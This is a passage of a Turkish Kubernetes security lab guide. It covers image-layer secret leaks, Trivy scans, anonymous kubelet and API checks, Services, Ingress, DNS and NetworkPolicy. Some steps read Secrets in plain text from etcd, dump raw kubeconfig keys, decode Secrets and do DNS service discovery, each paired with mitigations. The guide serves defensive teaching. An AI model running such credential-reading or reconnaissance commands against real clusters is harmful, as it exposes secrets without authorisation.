# Kubernetes karşılıkları: hostPID, hostNetwork, privileged, hostPath (Gün 2-3'te göreceğiz)

# --- 3. İmaj katmanlarındaki sırlar ---
cat > Dockerfile.leaky << 'EOF'
FROM busybox:1.36
ARG DB_PASSWORD=Sifre123!
ENV API_TOKEN=tok_live_abc123
RUN echo "db sifresi kullaniliyor: $DB_PASSWORD" > /tmp/x && rm /tmp/x
CMD ["sh"]
EOF

docker build -f Dockerfile.leaky -t leaky:1 .
docker history --no-trunc leaky:1 | grep -E "DB_PASSWORD|API_TOKEN"
docker inspect leaky:1 --format '{{.Config.Env}}'
# 🔴 ARG/ENV değerleri ve silinen dosyalar önceki katmanlarda kalır — imajı çekebilen herkes okur
# ✅ Doğrusu: BuildKit secret mount (RUN --mount=type=secret,id=db ...) veya sırrı runtime'da (K8s Secret) vermek

# --- 4. Zafiyet taraması (Trivy — container olarak, kurulum gerekmez) ---
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \
  aquasec/trivy:0.58.1 image --scanners vuln --severity HIGH,CRITICAL k8s-demo-app:v1 | tail -15

docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \
  aquasec/trivy:0.58.1 image --scanners vuln --severity HIGH,CRITICAL k8s-demo-app:distroless | tail -15
# slim ve distroless imajların bulgu sayılarını karşılaştırın
# ⚠️ docker.sock'u bir container'a mount etmek ona host üzerinde ROOT yetkisi verir.
#    Burada sürümü sabitlenmiş, güvendiğimiz bir araç için bilerek yapıyoruz.

# Temizlik
docker rmi leaky:1
```

---

### Lab 1.3 — Cluster'a İlk Bakış ve Mimari İnceleme

```bash
# Cluster çalışmıyorsa Bölüm 6'daki standart komutla başlatın
minikube status

# Cluster bilgisi
kubectl cluster-info
kubectl get nodes -o wide
kubectl get pods -A

# Control Plane bileşenleri
kubectl get pods -n kube-system
kubectl get pods -n kube-system | grep -E "etcd|apiserver|scheduler|controller|proxy|coredns|calico"

# API Server sağlık kontrolü (bileşen bazında)
kubectl get --raw='/readyz?verbose' | tail -15

# kubelet bir pod değil — node üzerinde systemd servisi olarak çalışır
minikube ssh -- sudo systemctl status kubelet --no-pager | head -5

# === Gün 1 çalışma namespace'i ===
# Gün 1'in geri kalan lab'ları bu namespace'te yapılır; gün sonunda tek komutla temizlenir.
# (set-context komutunu Lab 1.6'da ayrıntılı açıklayacağız)
kubectl create namespace gun1
kubectl config set-context --current --namespace=gun1
```

---

### Lab 1.3b — 🔐 Saldırı Yüzeyi: kubelet, API Server ve etcd

```bash
# --- 1. kubelet API'si anonim erişime kapalı mı? (port 10250) ---
minikube ssh -- curl -sk https://localhost:10250/pods | head -c 200; echo
# Beklenen: Unauthorized
# 🔴 Pod listesi dönerse KRİTİK bulgu: anonim kubelet erişimi = tüm pod'larda komut çalıştırabilme

# --- 2. API Server'a kimliksiz istek (port 8443) ---
minikube ssh -- curl -sk https://localhost:8443/api/v1/namespaces | head -c 300; echo
# Beklenen: 403 Forbidden, kullanıcı "system:anonymous" → kimlik doğrulanmadan kaynak listelenemez

# --- 3. Secret'lar etcd'de nasıl saklanıyor? ---
kubectl create secret generic demo-secret --from-literal=password=SuperGizli123

kubectl -n kube-system exec etcd-minikube -- etcdctl \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=/var/lib/minikube/certs/etcd/ca.crt \
  --cert=/var/lib/minikube/certs/etcd/server.crt \
  --key=/var/lib/minikube/certs/etcd/server.key \
  get /registry/secrets/gun1/demo-secret | grep -a "SuperGizli"
# 🔴 Değer AÇIK METİN görünür → etcd'ye (veya etcd yedeğine) erişen herkes tüm Secret'ları okur
# ✅ Üretimde: encryption at rest (EncryptionConfiguration / KMS), etcd'ye sadece API Server erişebilmeli (mTLS + ağ), yedekler şifreli

kubectl delete secret demo-secret
```

---

### Lab 1.4 — İlk Pod Oluşturma

```bash
# Pod oluştur (imperative)
kubectl run ilk-pod --image=nginx:1.25

# Pod durumunu gör
kubectl get pods
kubectl get pod ilk-pod -o wide

# Pod detayları (events dahil)
kubectl describe pod ilk-pod

# Pod içine gir
kubectl exec -it ilk-pod -- bash
# İçerdeyken:
  ls /
  cat /etc/os-release
  exit

# Pod logları
kubectl logs ilk-pod

# Pod sil
kubectl delete pod ilk-pod
```

---

### Lab 1.5 — Deployment Oluşturma ve Scale

```bash
# Deployment oluştur (3 replica)
kubectl create deployment web-app --image=nginx:1.25 --replicas=3

# Durumları gör
kubectl get deployments
kubectl get replicasets
kubectl get pods -l app=web-app

# Detaylı bilgi
kubectl describe deployment web-app

# Self-healing: bir Pod'u sil → ReplicaSet hemen yenisini oluşturur
kubectl delete pod $(kubectl get pod -l app=web-app -o jsonpath='{.items[0].metadata.name}')
kubectl get pods -l app=web-app
# Yine 3 pod var; biri yeni oluşturuldu (AGE küçük)

# Scale up
kubectl scale deployment web-app --replicas=5
kubectl get pods -l app=web-app -w
# Ctrl+C ile çık

# Scale down
kubectl scale deployment web-app --replicas=2
kubectl get pods -l app=web-app

# Temizlik
kubectl delete deployment web-app
```

---

### Lab 1.6 — Namespace, kubeconfig ve Context Yönetimi

```bash
# === Namespace Oluşturma ===
kubectl create namespace egitim

# Namespace listesi
kubectl get namespaces

# === kubeconfig ve Context ===
# kubeconfig dosyası: ~/.kube/config
# Context = Cluster + User + Namespace kombinasyonu

# Aktif context'i gör
kubectl config current-context
# Çıktı: minikube

# Tüm context'leri listele (star * aktif olanı gösterir)
kubectl config get-contexts

# kubeconfig içeriğini gör (sadece aktif context)
kubectl config view --minify

# 🔐 kubeconfig = KİMLİK BİLGİSİ. --raw ile gizlenen alanlar görünür (özel anahtar dahil)
kubectl config view --minify --raw | grep -E "client-key|client-certificate" | cut -c1-60
# Bu dosyayı kimseyle paylaşmayın, git'e koymayın, ekran paylaşımında --raw kullanmayın.

# Aktif context'in namespace'ini değiştir
kubectl config set-context --current --namespace=egitim

# Artık her komut egitim namespace'inde çalışır
kubectl get pods
# (boş döner — egitim namespace'inde pod yok)

# Gün 1 çalışma namespace'ine geri dön
kubectl config set-context --current --namespace=gun1

# Namespace'i sil
kubectl delete namespace egitim

# === ÖNEMLİ: Context switching ===
# Birden fazla cluster'ınız varsa (local + shared lab):
# kubectl config get-contexts        # tüm cluster'ları listele
# kubectl config use-context <name>  # başka cluster'a geç
# Lens'te aynı kubeconfig dosyasını import edersiniz
```

> **Not:** Eğitim boyunca her lab'da `kubectl config set-context --current --namespace=...` komutunu göreceksiniz. Artık bunun ne yaptığını biliyorsunuz — aktif context'in varsayılan namespace'ini değiştirir, böylece her komuta `-n <namespace>` yazmak zorunda kalmazsınız.

---

### Lab 1.7 — ConfigMap ve Secret

```bash
# ConfigMap oluştur
kubectl create configmap app-config \
  --from-literal=APP_COLOR=blue \
  --from-literal=APP_MODE=production

# Secret oluştur
kubectl create secret generic app-secret \
  --from-literal=DB_PASSWORD=s3cr3t

# Görüntüle
kubectl get configmap app-config -o yaml
kubectl get secret app-secret -o yaml

# Base64 decode (Secret değerini oku)
kubectl get secret app-secret -o jsonpath='{.data.DB_PASSWORD}' | base64 -d; echo

# 🔐 base64 bir ŞİFRELEME DEĞİL, sadece kodlamadır. Secret'ı okuyabilen (get/list secrets yetkisi olan)
#    herkes değeri açık metin görür. Lab 1.3b'de etcd'de de açık metin durduğunu gördük.
#    Korunma: RBAC ile secrets erişimini daraltmak, etcd encryption at rest,
#    harici sır yöneticileri (Vault, External Secrets Operator, Sealed Secrets)

# Temizlik
kubectl delete configmap app-config
kubectl delete secret app-secret
```

---

### Lab 1.8 — YAML ile Declarative Yönetim

```bash
# Çalışma dizini
cd ~/k8s-lab/day1

# Deployment YAML oluştur
cat > deployment.yaml << 'EOF'
apiVersion: apps/v1
kind: Deployment
metadata:
  name: web-deploy
  labels:
    app: web
spec:
  replicas: 3
  selector:
    matchLabels:
      app: web
  template:
    metadata:
      labels:
        app: web
    spec:
      containers:
      - name: nginx
        image: nginx:1.25
        ports:
        - containerPort: 80
EOF

# Apply et (oluştur)
kubectl apply -f deployment.yaml

# Kontrol et
kubectl get deployments
kubectl get pods -l app=web
kubectl describe deployment web-deploy

# YAML güncelle — VS Code ile aç
code deployment.yaml
# replicas: 3 → replicas: 5 yap, kaydet

# Tekrar apply (güncelle)
kubectl apply -f deployment.yaml
kubectl get pods -l app=web

# Sil
kubectl delete -f deployment.yaml
```

---

### Lab 1.9 — Pod Hata Durumları İnceleme

```bash
# Hatalı image (ImagePullBackOff)
kubectl run bad-pod --image=nginx:nonexistent-tag
kubectl get pod bad-pod
kubectl describe pod bad-pod
# Events bölümünde ImagePullBackOff gör

# Çöküyor Pod (CrashLoopBackOff)
kubectl run crash-pod --image=busybox:1.36 --restart=Always -- \
  /bin/sh -c "echo 'Uygulama basliyor...'; echo 'HATA: DB_HOST tanimli degil' >&2; exit 1"
kubectl get pod crash-pod -w
# Biraz bekle, CrashLoopBackOff gör, Ctrl+C

kubectl logs crash-pod              # son denemenin logları
kubectl logs crash-pod --previous   # bir önceki (çöken) container'ın logları
kubectl describe pod crash-pod      # Last State: Terminated, Exit Code: 1

# Temizlik
kubectl delete pod bad-pod crash-pod
```

---

### Lab 1.10 — Gün 1 Entegre Uygulama 

```bash
cd ~/k8s-lab/day1

# --- Adım 1: Namespace ---
kubectl create namespace my-lab
kubectl config set-context --current --namespace=my-lab

# --- Adım 2: ConfigMap ve Secret ---
kubectl create configmap app-config \
  --from-literal=BG_COLOR=lightblue \
  --from-literal=TITLE="My K8s App"

kubectl create secret generic app-secret \
  --from-literal=API_KEY=mysecret123

# --- Adım 3: Deployment YAML yaz ---
cat > my-app.yaml << 'EOF'
apiVersion: apps/v1
kind: Deployment
metadata:
  name: my-web-app
  labels:
    app: my-web
    tier: frontend
spec:
  replicas: 3
  selector:
    matchLabels:
      app: my-web
  template:
    metadata:
      labels:
        app: my-web
        tier: frontend
    spec:
      containers:
      - name: nginx
        image: nginx:1.25
        ports:
        - containerPort: 80
        env:
        - name: BG_COLOR
          valueFrom:
            configMapKeyRef:
              name: app-config
              key: BG_COLOR
        - name: API_KEY
          valueFrom:
            secretKeyRef:
              name: app-secret
              key: API_KEY
EOF

kubectl apply -f my-app.yaml

# --- Adım 4: İncele ---
kubectl get deployments
kubectl get pods -o wide
kubectl describe deployment my-web-app
kubectl get pods -l app=my-web

# Env değişkenlerini doğrula
kubectl exec $(kubectl get pod -l app=my-web -o jsonpath='{.items[0].metadata.name}') -- env | grep -E "BG_COLOR|API_KEY"
# 🔐 Env olarak verilen Secret, pod'da `exec` yetkisi olan herkes tarafından okunur ve
#    alt process'lere / crash dump'lara / hatalı loglamaya sızabilir.
#    Gün 3 final senaryosunda Secret'ı salt-okunur DOSYA olarak mount edeceğiz.

# --- Adım 5: Scale ---
kubectl scale deployment my-web-app --replicas=5
kubectl get pods -l app=my-web -w
# 5 pod Ready olunca Ctrl+C

kubectl scale deployment my-web-app --replicas=2
kubectl get pods -l app=my-web

# --- Adım 6: Image güncelle ---
kubectl set image deployment/my-web-app nginx=nginx:1.26
kubectl rollout status deployment/my-web-app
kubectl rollout history deployment/my-web-app
kubectl get pods -l app=my-web -o wide

# --- Adım 7: Temizlik ---
kubectl delete deployment my-web-app
kubectl delete configmap app-config
kubectl delete secret app-secret
kubectl config set-context --current --namespace=gun1
kubectl delete namespace my-lab
```

---

## 9. GÜN 2

### Servis, Ağ, Depolama ve Yetkilendirme

---

### Lab 2.1 — ClusterIP Service

```bash
cd ~/k8s-lab
mkdir -p day2
cd day2

# Gün 2 çalışma namespace'i (gün sonunda tek komutla temizlenir)
kubectl create namespace gun2
kubectl config set-context --current --namespace=gun2

# Deployment oluştur
kubectl create deployment backend --image=nginx:1.25 --replicas=3

# ClusterIP Service
kubectl expose deployment backend --port=80 --target-port=80 --type=ClusterIP

# Service'i gör
kubectl get svc backend
kubectl get svc backend -o wide

# Endpoint'leri gör
kubectl get endpoints backend

# Cluster içinden test et (netshoot: curl, dig, nslookup, nmap, tcpdump içeren ağ araç kutusu)
kubectl run test-pod --rm -it --image=nicolaka/netshoot:v0.13 --restart=Never -- bash
# netshoot içinde:
  curl -s http://backend | head -5
  nslookup backend
  nslookup backend.gun2.svc.cluster.local
  cat /etc/resolv.conf
  exit

# TARAYICIDA GÖSTER (ClusterIP dışarıdan erişilemez, port-forward ile):
# YENİ terminalde çalıştır:
kubectl port-forward svc/backend 8080:80
# Sonra tarayıcıda aç: http://localhost:8080
# nginx welcome page görünür — ClusterIP servisi çalışıyor
# Ctrl+C ile port-forward'ı kapat
# 🔐 port-forward, Service'i dışarı açmadan erişim sağlar ama bunu yapabilmek için
#    RBAC'te pods/portforward yetkisi gerekir — bu yetki bir "arka kapı" gibidir, dikkatle verin.

# Temizlik
kubectl delete deployment backend
kubectl delete svc backend
```

---

### Lab 2.2 — NodePort Service

```bash
# Deployment
kubectl create deployment backend --image=nginx:1.25 --replicas=2

# NodePort
kubectl expose deployment backend --port=80 --type=NodePort --name=backend-np

# Port'u gör
kubectl get svc backend-np

# Erişim — node üzerindeki portu doğrudan test et (tüm platformlarda çalışır)
NODE_PORT=$(kubectl get svc backend-np -o jsonpath='{.spec.ports[0].nodePort}')
echo "NodePort: $NODE_PORT"
minikube ssh -- curl -s http://localhost:$NODE_PORT | head -5

# Tarayıcıdan erişim:
#  - Linux / Yol C (Hyper-V, VirtualBox): http://$(minikube ip):$NODE_PORT
#  - macOS / Windows Yol A-B (docker driver): AYRI terminalde
#        minikube service backend-np -n gun2 --url
#    verilen URL'i açın (terminal açık kaldığı sürece çalışır)
#  - Codespaces: kubectl port-forward svc/backend-np 8080:80
# ⚠️ minikube service komutu varsayılan olarak "default" namespace'e bakar → -n gun2 şart

# 🔐 NodePort, cluster'daki HER node'un IP'sinde bu portu açar (30000-32767).
#    Node'lara erişebilen herkes servise de erişir — firewall / security group kurallarını gözden geçirin.

# Temizlik
kubectl delete deployment backend
kubectl delete svc backend-np
```

---

### Lab 2.3 — LoadBalancer Service

```bash
kubectl create deployment backend --image=nginx:1.25 --replicas=2

kubectl expose deployment backend --port=80 --type=LoadBalancer --name=backend-lb

kubectl get svc backend-lb
# EXTERNAL-IP <pending> görünecek

# minikube tunnel (YENİ terminal aç, çalıştır — macOS/Linux'ta sudo şifresi isteyebilir)
minikube tunnel

# Orijinal terminalde tekrar kontrol et
kubectl get svc backend-lb
# Artık EXTERNAL-IP dolu olmalı (docker driver'da genelde 127.0.0.1)

EXTERNAL_IP=$(kubectl get svc backend-lb -o jsonpath='{.status.loadBalancer.ingress[0].ip}')
curl -s http://$EXTERNAL_IP | head -5

# TARAYICIDA DOĞRULA: http://<EXTERNAL-IP>
# (Codespaces'te tunnel yerine port-forward kullanın)
# 🔐 Bulutta type: LoadBalancer = internete açık bir IP. Gerekmiyorsa internal LB annotation'ı ve
#    loadBalancerSourceRanges ile kaynak IP kısıtlaması kullanın.

# Temizlik (minikube tunnel terminalini Ctrl+C ile kapat)
kubectl delete deployment backend
kubectl delete svc backend-lb
```

---

### Lab 2.4 — Service Selector ve Endpoint İnceleme

```bash
cd ~/k8s-lab/day2

# Deployment + Service tek dosyada
cat > web-with-svc.yaml << 'EOF'
apiVersion: apps/v1
kind: Deployment
metadata:
  name: web-deploy
spec:
  replicas: 3
  selector:
    matchLabels:
      app: web
  template:
    metadata:
      labels:
        app: web
    spec:
      containers:
      - name: nginx
        image: nginx:1.25
        ports:
        - containerPort: 80
---
apiVersion: v1
kind: Service
metadata:
  name: web-svc
spec:
  type: ClusterIP
  selector:
    app: web
  ports:
  - port: 80
    targetPort: 80
EOF

kubectl apply -f web-with-svc.yaml

# Endpoint'leri gör — 3 tane olmalı
kubectl get svc web-svc
kubectl get endpoints web-svc

# Scale up → endpoint artar
kubectl scale deployment web-deploy --replicas=5
kubectl get endpoints web-svc

# Bir pod'dan label'ı kaldır → endpoint'ten düşer
POD_NAME=$(kubectl get pod -l app=web -o jsonpath='{.items[0].metadata.name}')
kubectl label pod $POD_NAME app-
kubectl get endpoints web-svc
kubectl get pods --show-labels
# Dikkat: ReplicaSet "app=web" label'lı pod sayısını 5'te tutmak için HEMEN yeni bir pod oluşturur.
# Endpoint sayısı kısa sürede yine 5 olur; label'ı kaldırılan pod "sahipsiz" (orphan) kalır.

# Geri ekle → ReplicaSet artık 6 pod görür ve fazlalığı siler
kubectl label pod $POD_NAME app=web
kubectl get pods -l app=web
kubectl get endpoints web-svc

# 🔐 Service, trafiği sadece LABEL'a göre yönlendirir. Namespace'te pod oluşturabilen veya
#    label değiştirebilen biri, "app=web" label'lı sahte bir pod ile trafiğin bir kısmını ele geçirebilir.
#    pods: create / patch yetkileri bu yüzden hassastır.

# Temizlik
kubectl delete -f web-with-svc.yaml
```

---

### Lab 2.4b — Ingress ile Path-Based Routing

> **Ingress:** L7 (HTTP) load balancer — tek IP'den birden fazla Service'e path bazlı yönlendirme. NodePort/LoadBalancer L4'te çalışır, Ingress L7'de.

```bash
# Ingress controller çalışıyor mu? (Bölüm 6'da etkinleştirildi)
kubectl get pods -n ingress-nginx

# Farklı yanıt veren iki backend (http-echo: verilen metni döner, port 5678)
kubectl create deployment web --image=hashicorp/http-echo:1.0 -- /http-echo -text="WEB servisi yanit verdi"
kubectl expose deployment web --port=80 --target-port=5678 --name=web-svc
kubectl create deployment api --image=hashicorp/http-echo:1.0 -- /http-echo -text="API servisi yanit verdi"
kubectl expose deployment api --port=80 --target-port=5678 --name=api-svc

# Ingress: / → web, /api → api
cat > ingress.yaml << 'EOF'
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: path-routing
spec:
  ingressClassName: nginx
  rules:
  - http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: web-svc
            port:
              number: 80
      - path: /api
        pathType: Prefix
        backend:
          service:
            name: api-svc
            port:
              number: 80
EOF

kubectl apply -f ingress.yaml
kubectl get ingress
# ADDRESS alanının dolması 30-60 sn sürebilir

# Ingress controller'a port-forward ile eriş (tüm platformlarda aynı şekilde çalışır)
kubectl port-forward -n ingress-nginx svc/ingress-nginx-controller 8081:80 >/dev/null &
sleep 3

curl -s http://localhost:8081/        # → WEB servisi yanit verdi
curl -s http://localhost:8081/api     # → API servisi yanit verdi
# Aynı giriş noktası, path'e göre farklı servisler!

kill %1   # arka plandaki port-forward'ı kapat

# 🔐 Güvenlik notları:
# - Ingress controller internete açık ve cluster genelinde Secret okuyabilen bir bileşendir → yüksek değerli hedef.
#   Örnek: CVE-2025-1974 "IngressNightmare" — ingress-nginx admission webhook üzerinden kimliksiz RCE.
# - ingress-nginx projesi emekliye ayrıldı; yeni kurulumlarda Gateway API + aktif desteklenen bir controller tercih edin.
# - TLS'i Ingress'te sonlandırın (spec.tls + Secret) ve HTTP'yi HTTPS'e yönlendirin.

# Temizlik
kubectl delete -f ingress.yaml
kubectl delete deployment web api
kubectl delete svc web-svc api-svc
```

---

### Lab 2.5 — Pod Ağ İletişimi, DNS ve Ağ Debugging

```bash
# İki Pod oluştur
kubectl run pod1 --image=busybox:1.36 -- sleep 3600
kubectl run pod2 --image=busybox:1.36 -- sleep 3600

# IP'leri gör
kubectl get pods -o wide

# Pod1'den Pod2'ye ping
POD2_IP=$(kubectl get pod pod2 -o jsonpath='{.status.podIP}')
kubectl exec -it pod1 -- ping -c 3 $POD2_IP

# Pod içindeki ağ arayüzleri
kubectl exec -it pod1 -- ip addr

# Temizlik
kubectl delete pod pod1 pod2
```

---

### Lab 2.6 — CoreDNS Test

```bash
# Service oluştur
kubectl create deployment dns-test --image=nginx:1.25
kubectl expose deployment dns-test --port=80

# DNS lookup
kubectl run dns-lookup --rm -it --image=nicolaka/netshoot:v0.13 --restart=Never -- nslookup dns-test

# FQDN ile
kubectl run dns-lookup2 --rm -it --image=nicolaka/netshoot:v0.13 --restart=Never -- nslookup dns-test.gun2.svc.cluster.local

# Pod içinde resolv.conf — search domains ve nameserver gör
kubectl run check-dns --rm -it --image=nicolaka/netshoot:v0.13 --restart=Never -- cat /etc/resolv.conf
# Çıktı:
#   nameserver 10.96.0.10          ← CoreDNS Service IP
#   search gun2.svc.cluster.local svc.cluster.local cluster.local
#   options ndots:5

# === DNS DEBUGGING (eğitmen ile birlikte) ===

# CoreDNS çalışıyor mu?
kubectl get pods -n kube-system -l k8s-app=kube-dns
# Ready olmalı — değilse DNS çözümleme çalışmaz

# CoreDNS logları (sorun varsa)
COREDNS_POD=$(kubectl get pod -n kube-system -l k8s-app=kube-dns -o jsonpath='{.items[0].metadata.name}')
kubectl logs -n kube-system $COREDNS_POD

# Pod içinden Service'e erişim testi
kubectl run web-test --rm -i --restart=Never --image=nicolaka/netshoot:v0.13 -- \
  curl -s --max-time 3 http://dns-test | head -4
# Başarılıysa ağ ve DNS çalışıyor

# Pod'dan dış DNS (internet) testi
kubectl run ext-dns --rm -i --restart=Never --image=nicolaka/netshoot:v0.13 -- nslookup example.com
# Çözümleniyorsa → CoreDNS ve CNI sağlıklı

# 🔐 DNS keşif için de kullanılır: cluster içindeki bir saldırgan Service'leri ve portlarını DNS ile bulabilir
# SRV kaydı sadece İSİMLİ portlar için oluşur (dns-test'in portu isimsiz). API Server Service'inin portu "https" adını taşır:
kubectl run dns-recon --rm -i --restart=Never --image=nicolaka/netshoot:v0.13 -- \
  dig +short SRV _https._tcp.kubernetes.default.svc.cluster.local
# Örnek çıktı: 0 100 443 kubernetes.default.svc.cluster.local.  → servis adı + port numarası
# Service adı/port bilgisi gizli değildir — güvenlik "gizliliğe" değil NetworkPolicy + kimlik doğrulamaya dayanmalı

# Temizlik
kubectl delete deployment dns-test
kubectl delete svc dns-test
```

---

### Lab 2.7 — NetworkPolicy ile Trafik Kontrolü (Ingress + Egress)

> **Ön koşul:** Cluster `--cni=calico` ile başlatılmış olmalı (Bölüm 6). Kontrol: `kubectl get pods -n kube-system -l k8s-app=calico-node`. Calico yoksa policy'ler oluşturulur ama **hiçbir şeyi engellemez**.

```bash
cd ~/k8s-lab/day2

kubectl create namespace netpol-demo

# Backend (nginx) + Service
kubectl create deployment backend --image=nginx:1.25 -n netpol-demo
kubectl expose deployment backend --port=80 -n netpol-demo

# İki istemci: "frontend" (meşru) ve "attacker" (ele geçirilmiş başka bir uygulama)
kubectl run frontend -n netpol-demo --image=nicolaka/netshoot:v0.13 --labels=app=frontend -- sleep infinity
kubectl run attacker -n netpol-demo --image=nicolaka/netshoot:v0.13 --labels=app=attacker -- sleep infinity
kubectl wait --for=condition=Ready pod --all -n netpol-demo --timeout=120s

# Kısayol: HTTP durum kodunu yazdıran test fonksiyonu (000 = bağlantı kurulamadı / engellendi)
probe() { kubectl exec -n netpol-demo "$1" -- curl -s -o /dev/null -w "%{http_code}\n" --max-time 3 "$2"; }

# === 1) Varsayılan: herkes herkese erişir (flat network) ===
probe frontend http://backend     # 200
probe attacker http://backend     # 200  ← 🔴 lateral movement mümkün

# === 2) Default deny (ingress) ===
cat > default-deny.yaml << 'EOF'
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-ingress
  namespace: netpol-demo
spec:
  podSelector: {}
  policyTypes:
  - Ingress
EOF

kubectl apply -f default-deny.yaml
probe frontend http://backend     # 000
probe attacker http://backend     # 000

# === 3) Sadece frontend → backend:80 ===
cat > allow-frontend.yaml << 'EOF'
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-frontend-to-backend
  namespace: netpol-demo
spec:
  podSelector:
    matchLabels:
      app: backend
  policyTypes:
  - Ingress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: frontend
    ports:
    - protocol: TCP
      port: 80
EOF

kubectl apply -f allow-frontend.yaml
probe frontend http://backend     # 200 ✅
probe attacker http://backend     # 000 ✅

# === 4) Egress: frontend internete çıkamasın (veri sızdırma / C2 engelleme) ===
probe frontend https://example.com   # 200 (henüz egress kuralı yok)

cat > frontend-egress.yaml << 'EOF'
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: frontend-egress
  namespace: netpol-demo
spec:
  podSelector:
    matchLabels:
      app: frontend
  policyTypes:
  - Egress
  egress:
  # DNS'e izin ver (yoksa Service adları bile çözülemez)
  - to:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: kube-system
      podSelector:
        matchLabels:
          k8s-app: kube-dns
    ports:
    - protocol: UDP
      port: 53
    - protocol: TCP
      port: 53
  # Sadece backend:80'e çıkış
  - to:
    - podSelector:
        matchLabels:
          app: backend
    ports:
    - protocol: TCP
      port: 80
EOF

kubectl apply -f frontend-egress.yaml
probe frontend https://example.com   # 000 ✅ internet kapalı
probe frontend http://backend        # 200 ✅ izinli hedef çalışıyor
probe attacker https://example.com   # 200 ← attacker için egress kuralı yazmadık!

# === 5) Başka namespace'ten erişim ===
kubectl run outsider -n gun2 --rm -i --restart=Never --image=nicolaka/netshoot:v0.13 -- \
  curl -s -o /dev/null -w "%{http_code}\n" --max-time 3 http://backend.netpol-demo
# 000 → default-deny namespace dışından gelen trafiği de kapsar

kubectl get networkpolicy -n netpol-demo

# Temizlik
kubectl delete namespace netpol-demo
```

> 🔐 **Güvenlik notları**
> - NetworkPolicy bir **izin listesidir**: bir pod'u seçen hiçbir policy yoksa o pod'a her şey açıktır. Her namespace'e `default-deny` ile başlayın; hem Ingress hem Egress için.
> - Egress'i unutmayın: ele geçirilen bir pod'un internete (C2, veri sızdırma) ve **bulut metadata servisine (169.254.169.254)** çıkması, node kimlik bilgilerinin çalınmasına yol açabilir. Bulutta egress kuralında `ipBlock` + `except: [169.254.169.254/32]` kullanın.
> - `kubectl port-forward` trafiği kubelet üzerinden pod'un kendi `localhost`'una gelir → **NetworkPolicy'yi atlar**. `pods/portforward` yetkisini dikkatle verin.
> - Policy yazdıktan sonra **her zaman bir test pod'uyla doğrulayın** — yanlış label tek bir harf farkla tüm kuralı etkisiz bırakır.

---

### Lab 2.8 — emptyDir Volume

```bash
cd ~/k8s-lab/day2

cat > volume-demo.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: volume-pod
spec:
  containers:
  - name: writer
    image: busybox:1.36
    command: ["/bin/sh", "-c", "while true; do echo $(date) >> /data/log.txt; sleep 5; done"]
    volumeMounts:
    - name: shared-data
      mountPath: /data
  - name: reader
    image: busybox:1.36
    command: ["/bin/sh", "-c", "tail -f /data/log.txt"]
    volumeMounts:
    - name: shared-data
      mountPath: /data
  volumes:
  - name: shared-data
    emptyDir: {}
EOF

kubectl apply -f volume-demo.yaml

# Reader container'ın loglarını gör (writer'ın yazdığını okur)
kubectl logs volume-pod -c reader

# Writer container'dan dosyayı oku
kubectl exec -it volume-pod -c writer -- cat /data/log.txt

# Temizlik
kubectl delete -f volume-demo.yaml
```

---

### Lab 2.9 — PersistentVolumeClaim (Dinamik Provisioning)

```bash
cd ~/k8s-lab/day2

# Storage class'ları gör
kubectl get storageclass

# PVC oluştur
cat > pvc.yaml << 'EOF'
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: data-pvc
spec:
  accessModes:
  - ReadWriteOnce
  storageClassName: standard
  resources:
    requests:
      storage: 1Gi
EOF

kubectl apply -f pvc.yaml

# PVC ve otomatik PV'yi gör
kubectl get pvc
kubectl get pv

# PVC'yi Pod'a bağla
cat > app-with-pvc.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: db-pod
spec:
  containers:
  - name: redis
    image: redis:7-alpine
    volumeMounts:
    - name: data
      mountPath: /data
  volumes:
  - name: data
    persistentVolumeClaim:
      claimName: data-pvc
EOF

kubectl apply -f app-with-pvc.yaml
kubectl get pods
kubectl exec -it db-pod -- ls -la /data

# Veri yaz
kubectl exec -it db-pod -- sh -c "echo 'merhaba kalici veri' > /data/test.txt"
kubectl exec -it db-pod -- cat /data/test.txt

# Pod'u sil ve yeniden oluştur — veri kalıyor mu?
kubectl delete -f app-with-pvc.yaml
kubectl apply -f app-with-pvc.yaml

# Veri hala orada
kubectl exec -it db-pod -- cat /data/test.txt

# Temizlik
kubectl delete -f app-with-pvc.yaml
kubectl delete -f pvc.yaml
```

---

### Lab 2.9a — Statik Provisioning (Admin'in Önceden Oluşturduğu PV)

> Dinamik provisioning'de PV'yi StorageClass otomatik oluşturdu. Statik yöntemde admin PV'yi elle tanımlar, PVC ona bağlanır.

```bash
cd ~/k8s-lab/day2

cat > static-pv.yaml << 'EOF'
apiVersion: v1
kind: PersistentVolume
metadata:
  name: static-pv
spec:
  capacity:
    storage: 1Gi
  accessModes: [ReadWriteOnce]
  persistentVolumeReclaimPolicy: Retain
  storageClassName: manual
  hostPath:
    path: /data/static-pv
    type: DirectoryOrCreate
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: static-pvc
spec:
  accessModes: [ReadWriteOnce]
  storageClassName: manual
  resources:
    requests:
      storage: 1Gi
EOF

kubectl apply -f static-pv.yaml
kubectl get pv static-pv          # STATUS: Bound, CLAIM: gun2/static-pvc
kubectl get pvc static-pvc        # VOLUME: static-pv

# Reclaim policy = Retain: PVC silinince ne olur?
kubectl delete pvc static-pvc
kubectl get pv static-pv          # STATUS: Released → veri korunur, otomatik yeniden bağlanmaz

# Temizlik (PV cluster-scoped'dur, namespace'e ait değildir)
kubectl delete pv static-pv
```

> PV **cluster-scoped**, PVC **namespace-scoped** bir kaynaktır. 🔐 hostPath PV sadece tek node'lu lab ortamı içindir — neden tehlikeli olduğunu Lab 2.9c'de göreceğiz.

---

### Lab 2.9b — StatefulSet ile Kalıcı Veriye Sahip Uygulama

> **Geçiş:** PVC'yi tek bir Pod'a bağladık. Ama gerçek bir veritabanı cluster'ı çalıştırırken her Pod'un kendi diski olmalı ve sıralı başlamalıdır. StatefulSet bunu sağlar — PV/PVC ile Deployment mantığını birleştirir.

```bash
cd ~/k8s-lab/day2

